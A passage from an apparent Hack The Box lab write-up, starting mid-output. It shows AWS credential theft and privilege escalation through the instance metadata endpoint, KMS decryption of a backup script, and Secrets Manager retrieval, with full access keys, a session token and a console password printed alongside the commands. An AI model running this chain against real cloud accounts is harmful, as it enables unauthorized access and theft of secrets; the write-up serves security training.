  "Token" : "IQoJb3JpZ2luX2VjEJT//////////wEaCXVzLWVhc3QtMSJIMEYCIQDB/Bk9w5u3aB063MV5P5wZlmYK6+ThzRgMcCP8QMK12wIhANYti0aZiWkZLnh0+RNpqCojCFWuxHiVbd4LswrYPnSSKsYFCOz//////////wEQAxoMNTMyNTg3MTY4MTgwIgy7dGBmfQzvURPbSXAqmgXu5jx7fpusoJ8QN5DLpT2YjoVM/KTl3a9UnWRW5+QFjPNznT6o11mDRapA6uCsQFel9gA0quBe9H8me25DmiiD1LfXG8K29pE89L10xgbWrNcPUmA6774NaJU+VGZlhDcXD01xEiLnWNVKGJ8+JQzlQJlrtSIzUQgbuCgdGA0hhv7VKqNZHEtGEJODm2puOapIhbHsSTo+X5CDHISwBKHdAw5Hgvmcd8/mCLoAlDOayZ2YrVpYfMnrVcqjGYcoxb6kaP3UdOQeH5vOBPZD+Pke80RpPVnYmNQ7mTloVbKGDBLazvlxvRl4mfIJQd7eI4MwtXDfyFWOKkDpPkI/rzdfXkOFrG2jvJhZflC39jXeWOgrOFcYcMyIU+oPgIWE7SEWKBIa9PeNF5KpmXdrxfrjo27yQoSojO8WX3/jgdMov3ddEaMxQkgHiP9+S1/y8COdXTukcWC57O6Z/NKxyRaf6ywVoteKDdU5KTB8qFwT1BbMJovYvD3MzRdEff9b8HZXHSoUuOd8CmNNSLRw1egwiaZMnqNgetp7QqFQMuvjLnhrTFW/iLKQuPjrJNvzN1y078mPvaob/v+q2H2kIvvBI68RYWZ3ZwRJh51b/fxmfG6LgWfQIfnmvOQ8vk9KZkhknqQaX4SHoV0R2ZzM798jVAk0D7P/FcFxY523gUvujcdtk2AmKK+zhSJQA55EzWb34maXLtYtJFC3CNV3zfmyKr0+A/nh+3AVsJAzvNfKq2b3KGReE/QghbNTH0fJJpd/0be9GcOFp+dxPbTSB5Vnxk/LUx7P+JcEW2rBhbsV5wfXS9LlqxiuTMypVZXMF66R/M/MSPRaK3LfbjADj6OYiTrmE4Q6WsxMHJpnWLpz7z7NWaxR9ARu4+Iw0bjtsQY6sAGz5+CQ9R7DtDy1aKTfExfDJM1VTviG2ysgnsAtKd90wyxKcONB22697qTJcHrqWnlTz+FCBQnqHc9WKmOBCtPjwhqB2oMc1uU31gY3d4PVO/tePVCfKSf2/5QDMmSwloHJBD7jfZ+WP2lyB79WF6gzAiK4k6Du8ZsporxGuljRYn6lNL5SlEpJ2LM3iuIxUPLnDXewbtnq5dlpQj4XZWgp4Mcu7Ft/r8hWiLuhccBNCQ==",
  "Expiration" : "2024-05-08T17:27:04Z"
}
```

Excellent, we have obtained the role account. Now, let's query the info file to discern the nature of the role.

```
C:\Users\Public>curl http://169.254.169.254/latest/meta-data/iam/info
<SNIP>
{
  "Code" : "Success",
  "LastUpdated" : "2024-05-08T11:04:49Z",
  "InstanceProfileArn" : "arn:aws:iam::532587168180:instance-profile/WindowsVM-KMS",
  "InstanceProfileId" : "AIPAXYAFLIG2AFHEWFQRZ"
}
```

Examining the output, it appears to denote a Windows VM KMS, which could be linked to AWS Key Management Service (KMS). However, to gain clarity, let's proceed with enumerating the permissions associated with this account to understand its capabilities comprehensively.

```
python3 enumerate-iam.py --access-key ASIAXYAFLIG2MNAYNCIQ --secret-key tcjyvVvTU6wCpSy7o10BEBTIewfcKu1JRnRN4cSI --session-token IQoJb3JpZ2luX<SNIP>
2024-05-08 11:20:03,484 - 80623 - [INFO] Starting permission enumeration for access-key-id "ASIAXYAFLIG2MNAYNCIQ"
2024-05-08 11:20:04,186 - 80623 - [INFO] -- Account ARN : arn:aws:sts::532587168180:assumed-role/KMSRoleWin/i-0e5dabca0fa9f222f
2024-05-08 11:20:04,186 - 80623 - [INFO] -- Account Id  : 532587168180
2024-05-08 11:20:04,186 - 80623 - [INFO] -- Account Path: assumed-role/KMSRoleWin/i-0e5dabca0fa9f222f
2024-05-08 11:20:05,210 - 80623 - [INFO] Attempting common-service describe / list brute force.
2024-05-08 11:20:07,974 - 80623 - [INFO] -- sts.get_caller_identity() worked!
2024-05-08 11:20:09,623 - 80623 - [INFO] -- dynamodb.describe_endpoints() worked!
2024-05-08 11:20:09,728 - 80623 - [INFO] -- kms.list_keys() worked!
2024-05-08 11:20:09,819 - 80623 - [INFO] -- kms.list_aliases() worked!
```

It appears that we have permissions related to AWS KMS, enabling us to perform actions such as listing keys and aliases. However, the current tool is unable to detect these capabilities. To facilitate future interactions, we will save the credentials, including the session token, inside the `~/.aws/credentials` file.

```
[default]
aws_access_key_id = ASIAXYAFLIG2MNAYNCIQ
aws_secret_access_key = tcjyvVvTU6wCpSy7o10BEBTIewfcKu1JRnRN4cSI
aws_session_token = IQoJb3JpZ2lu<SNIP>
```

After saving the credentials in the `~/.aws/credentials` file, our next step involves attempting to list the keys associated with AWS KMS.
```
aws kms list-keys
{
    "Keys": [
        {
            "KeyId": "038c41d9-b337-43fe-a0a3-6d622bb7131d",
            "KeyArn": "arn:aws:kms:us-east-1:532587168180:key/038c41d9-b337-43fe-a0a3-6d622bb7131d"
        },
        {
            "KeyId": "046474ec-5556-4440-bb9b-566d31769033",
            "KeyArn": "arn:aws:kms:us-east-1:532587168180:key/046474ec-5556-4440-bb9b-566d31769033"
        },
        {
```

With multiple keys identified, our next task is to describe one of them to gain more detailed information about its configuration and usage.

```
aws kms describe-key --key-id 046474ec-5556-4440-bb9b-566d31769033

An error occurred (AccessDeniedException) when calling the DescribeKey operation: User: arn:aws:sts::532587168180:assumed-role/KMSRoleWin/i-0e5dabca0fa9f222f is not authorized to perform: kms:DescribeKey on resource: arn:aws:kms:us-east-1:532587168180:key/046474ec-5556-4440-bb9b-566d31769033 because no identity-based policy allows the kms:DescribeKey action
```

While most keys return an access denied message, there appears to be one key for which we have permissions. Let's proceed by examining the details of this particular key.

```
aws kms describe-key --key-id 038c41d9-b337-43fe-a0a3-6d622bb7131d
{
    "KeyMetadata": {
        "AWSAccountId": "532587168180",
        "KeyId": "038c41d9-b337-43fe-a0a3-6d622bb7131d",
        "Arn": "arn:aws:kms:us-east-1:532587168180:key/038c41d9-b337-43fe-a0a3-6d622bb7131d",
        "CreationDate": 1715090839.36,
        "Enabled": true,
        "Description": "KMSWin",
        "KeyUsage": "ENCRYPT_DECRYPT",
        "KeyState": "Enabled",
        "Origin": "AWS_KMS",
        "KeyManager": "CUSTOMER",
        "CustomerMasterKeySpec": "SYMMETRIC_DEFAULT",
        "KeySpec": "SYMMETRIC_DEFAULT",
        "EncryptionAlgorithms": [
            "SYMMETRIC_DEFAULT"
        ],
        "MultiRegion": false
    }
}
```

Based on the key description, `KMSWin` we can infer that this key was likely used for encrypting the file. Let's proceed by attempting to encrypt a file to determine if we have the necessary permissions.

```
echo testfile > f.txt
aws kms encrypt --key-id 038c41d9-b337-43fe-a0a3-6d622bb7131d --plaintext fileb://./f.txt
{
    "CiphertextBlob": "AQICAHiXxLGzn4yPo9MZ3yHj/EYWqOp30GxD+tuXQXHI7eqVggHjEI+/leGJwmq2kC004Gw9AAAAZzBlBgkqhkiG9w0BBwagWDBWAgEAMFEGCSqGSIb3DQEHATAeBglghkgBZQMEAS4wEQQMA4EQ59jeCLgmDVQ3AgEQgCSvTfJD3pOfQbywDPEulfPfnzZFcvUx4WBTrRknjjfCJFCXEt4=",
    "KeyId": "arn:aws:kms:us-east-1:532587168180:key/038c41d9-b337-43fe-a0a3-6d622bb7131d",
    "EncryptionAlgorithm": "SYMMETRIC_DEFAULT"
}
```

To validate our assumption, we'll create a sample file and encrypt it using the identified key. The encryption process should yield a base64-encoded representation of the encrypted file. Next, we'll decrypt this encrypted content and save it to a file. Finally, we'll use the file utility to examine if the decrypted file matches the format of the previously identified encrypted file.

```
echo AQICAHiXxLGzn4yPo9MZ3yHj/EYWqOp30GxD+tuXQXHI7eqVggHjEI+/leGJwmq2kC004Gw9AAAAZzBlBgkqhkiG9w0BBwagWDBWAgEAMFEGCSqGSIb3DQEHATAeBglghkgBZQMEAS4wEQQMA4EQ59jeCLgmDVQ3AgEQgCSvTfJD3pOfQbywDPEulfPfnzZFcvUx4WBTrRknjjfCJFCXEt4= | base64 -d > f.enc

file f.enc
f.enc: Windows Precompiled iNF, version 2.1, flags 0xb1c49778, volatile dir ids, verified, digitally signed, at 0x77eaa816, at 0x862a0906 WinDirPath, LanguageID 3001, at 0x6009061e
```

With the successful match confirming our encryption process, we can proceed to attempt decrypting the previously found encrypted file using the same key. This will help us determine if we have the necessary permissions to decrypt files encrypted with this key.

```
aws kms decrypt --ciphertext-blob fileb://./backup.ps1.enc --key-id 038c41d9-b337-43fe-a0a3-6d622bb7131d
{
    "KeyId": "arn:aws:kms:us-east-1:532587168180:key/038c41d9-b337-43fe-a0a3-6d622bb7131d",
    "Plaintext": "SW1wb3J0LU1vZHVsZSBBV1NQb3dlclNoZWxsCgokYWNjZXNzS2V5ID0gIkFLSUFYWUFGTElHMk5QQUU0QkFRIgokc2VjcmV0S2V5ID0gIkJwNXZ2UmRaaFFmUk8vY0pZK0FaRExqSWlXbHBTWmtyZGJ2NGhlaXEiCgokc2VjcmV0TmFtZSA9ICIiCiRzZWNyZXQgPSBHZXQtQVdTU2VjcmV0VmFsdWUgLVNlY3JldElkICRzZWNyZXROYW1lCiRzZWNyZXRKc29uID0gQ29udmVydEZyb20tSnNvbiAkc2VjcmV0LlNlY3JldFN0cmluZwokYWNjZXNzS2V5ID0gJHNlY3JldEpzb24uYWNjZXNzS2V5CiRzZWNyZXRLZXkgPSAkc2Vjcm<SNIP>",
    "EncryptionAlgorithm": "SYMMETRIC_DEFAULT"
}
```

Great! The decryption process appears to be successful, providing us with the decrypted file in base64 format. We'll now proceed by base64 decoding the content and saving it to a file.

```
echo SW1wb3J0LU1vZHVsZSBBV1NQb3dlclNoZWxsCgokYWNjZXNzS2V5ID0gIkFLSUFYWUFGTElHMk5QQUU0QkFRIgokc2VjcmV0S2V5ID0gIkJwNXZ2UmRaaFFmUk8vY0pZK0FaRExqSWlXbHBTWmtyZGJ2NGhlaXEiCgokc2VjcmV0TmFtZSA9ICIiCiRzZWNyZXQgPSBHZXQtQVdTU2VjcmV0VmFsdWUgLVNlY3JldElkICRzZWNyZXROYW1lCiRzZWNyZXRKc29uID0gQ2<SNIP> | base64 -d > backup.ps1
```

At last, we'll attempt to read the decrypted file. It appears to be a PowerShell script responsible for taking a snapshot of a volume. Additionally, we have a new IAM account key at our disposal, which opens up further possibilities for exploration and action.

```ps
Import-Module AWSPowerShell

$accessKey = "AKIAXYAFLIG2NPAE4BAQ"
$secretKey = "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"

$secretName = ""
$secret = Get-AWSSecretValue -SecretId $secretName
$secretJson = ConvertFrom-Json $secret.SecretString
$accessKey = $secretJson.accessKey
$secretKey = $secretJson.secretKey
Set-AWSCredentials -AccessKey $accessKey -SecretKey $secretKey

Set-DefaultAWSRegion -Region YOUR_AWS_REGION

$instanceId = "vault11-ws"

$volumeId = (Get-EC2Instance -InstanceId $instanceId).Instances.BlockDeviceMappings | Where-Object { $_.DeviceName -eq "/dev/sda1" } | Select-Object -ExpandProperty Ebs | Select-Object -ExpandProperty VolumeId
Write-Host "Creating snapshot of root volume for EC2 instance $instanceId..."
$snapshot = New-EC2Snapshot -VolumeId $volumeId -Description "Backup snapshot for EC2 instance $instanceId"

Write-Host "Snapshot created successfully."
Write-Host "Snapshot ID: $($snapshot.SnapshotId)"

Clear-AWSCredentials
```

We'll proceed by attempting to enumerate the permissions associated with this new IAM key using the enumeration tool. This will provide us with insights into the capabilities and access levels granted by this key.

```
python3 enumerate-iam.py --access-key AKIAXYAFLIG2NPAE4BAQ --secret-key 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
2024-05-08 12:06:40,782 - 80797 - [INFO] Starting permission enumeration for access-key-id "AKIAXYAFLIG2NPAE4BAQ"
2024-05-08 12:06:41,503 - 80797 - [INFO] -- Account ARN : arn:aws:iam::532587168180:user/vaultmanager
2024-05-08 12:06:41,503 - 80797 - [INFO] -- Account Id  : 532587168180
2024-05-08 12:06:41,503 - 80797 - [INFO] -- Account Path: user/vaultmanager
2024-05-08 12:06:41,598 - 80797 - [INFO] Attempting common-service describe / list brute force.
2024-05-08 12:06:42,621 - 80797 - [ERROR] Remove codedeploy.get_deployment_target action
2024-05-08 12:06:42,715 - 80797 - [ERROR] Remove codedeploy.list_deployment_targets action
2024-05-08 12:06:42,814 - 80797 - [ERROR] Remove codedeploy.batch_get_deployment_targets action
2024-05-08 12:06:44,756 - 80797 - [INFO] -- secretsmanager.list_secrets() worked!
2024-05-08 12:06:46,573 - 80797 - [INFO] -- sts.get_caller_identity() worked!
2024-05-08 12:06:46,671 - 80797 - [INFO] -- sts.get_session_token() worked!
2024-05-08 12:06:48,415 - 80797 - [INFO] -- dynamodb.describe_endpoints() worked!
```

The enumeration tool indicates permissions related to Secret Manager. To verify this, let's try listing all secrets using the AWS CLI. However, before proceeding, we must remove the existing credentials and reconfigure the AWS CLI with the new IAM key.

```
aws secretsmanager list-secrets
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:532587168180:secret:AWSVault11-gd6Hq8",
            "Name": "AWSVault11",
            "LastChangedDate": 1715087473.505,
            "LastAccessedDate": 1715040000.0,
            "SecretVersionsToStages": {
                "terraform-20240507123751892900000003": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": 1715085471.318
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:532587168180:secret:AWSVault11-dev-lYByRs",
            "Name": "AWSVault11-dev",
            "LastChangedDate": 1715090840.991,
            "LastAccessedDate": 1715040000.0,
            "SecretVersionsToStages": {
                "terraform-20240507140720756700000004": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": 1715090840.232
        }
    ]
}
```

Aws Cli returns 2 secrets AWSVault11 and dev. Lets try to describe secrets on that one.

```
aws secretsmanager describe-secret --secret-id AWSVault11

An error occurred (AccessDeniedException) when calling the DescribeSecret operation: User: arn:aws:iam::532587168180:user/vaultmanager is not authorized to perform: secretsmanager:DescribeSecret on resource: AWSVault11 because no identity-based policy allows the secretsmanager:DescribeSecret action
```

It appears that we do not have permissions to access the first secret. Let's try accessing the "dev" secret instead to see if we have the necessary permissions for it.

```
aws secretsmanager describe-secret --secret-id AWSVault11-dev
{
    "ARN": "arn:aws:secretsmanager:us-east-1:532587168180:secret:AWSVault11-dev-lYByRs",
    "Name": "AWSVault11-dev",
    "LastChangedDate": 1715090840.991,
    "LastAccessedDate": 1715040000.0,
    "VersionIdsToStages": {
        "terraform-20240507140720756700000004": [
            "AWSCURRENT"
        ]
    },
    "CreatedDate": 1715090840.232
}
```

Since we have permission to access the "dev" secret, let's proceed by attempting to retrieve the value of this secret. This will allow us to examine its contents and potentially uncover any valuable information.

```
aws secretsmanager get-secret-value --secret-id AWSVault11-dev
{
    "ARN": "arn:aws:secretsmanager:us-east-1:532587168180:secret:AWSVault11-dev-lYByRs",
    "Name": "AWSVault11-dev",
    "VersionId": "terraform-20240507140720756700000004",
    "SecretString": "{\"password\":\"DoYouFeelitNow1!?\",\"username\":\"kstone\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1715090840.985
}
```

With the retrieved username and password, our next step involves attempting to log in to the AWS console using these credentials. However, before proceeding, we need to obtain the console ID, also known as the account ID, which we have encountered multiple times and it is `532587168180`.

![](Asceticism.assets/aws_login.png)

We will input the owner ID as the account ID and proceed by clicking "Next".

![](Asceticism.assets/aws_login_again.png)

We'll input the credentials belonging to the user "kstone" and proceed by clicking "Sign In".

![](Asceticism.assets/aws-main.png)

Lets try to see s3 if we can now read the flag which was locked for us in the beginning.

![](Asceticism.assets/bucket.png)

We have permissions on s3 which is a good sign.

![](Asceticism.assets/flag_download.png)

We see the flag, we can now download it and read it.

```
cat flag.txt
HTB{W15D0M_15_5uFF3R1Ng_kA1_d3n_aGaP1_aF70}
```